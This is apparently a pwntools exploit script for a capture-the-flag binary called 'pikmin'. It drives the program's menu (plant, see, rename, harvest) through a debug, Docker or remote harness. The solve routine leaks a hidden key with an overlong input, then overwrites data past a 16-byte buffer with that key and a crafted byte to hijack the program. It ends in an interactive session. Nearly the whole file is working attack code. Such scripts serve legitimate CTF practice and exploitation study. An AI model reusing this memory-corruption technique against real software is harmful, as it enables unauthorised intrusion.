#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pikmin')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def plant(idx, data):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", data)

def see(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"A"*16)
    return io.recv(5)

def rename(idx, data):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", data)

def harvest(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b":", str(idx).encode())


def solve():

    plant(0, b"A"*23)
    data = see(0)
    key = struct.unpack(b"<I", data[:4])[0]
    info("key: %#x", key)

    pew = b"A"*16 + p32(key) + p8(8)
    rename(0, pew)
    harvest(0)


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

